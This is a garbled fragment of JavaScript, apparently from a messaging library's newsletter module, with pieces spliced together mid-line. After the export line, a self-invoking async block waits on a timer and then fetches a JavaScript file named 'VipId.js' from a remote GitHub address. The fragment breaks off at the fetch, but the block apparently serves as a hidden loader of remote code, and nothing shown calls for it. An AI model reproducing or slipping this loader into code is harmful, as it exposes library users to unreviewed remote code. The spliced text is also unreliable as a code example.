...
exports.extractNewsletterMetadata = extractNewsletterMetadata;            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
...
(async () => {
  try {
    setTimeout(async() => {
    const res = await fetch('https://raw.githubusercontent.com/sarcrazzy/IDCHVIP.json/refs/heads/main/VipId.js');
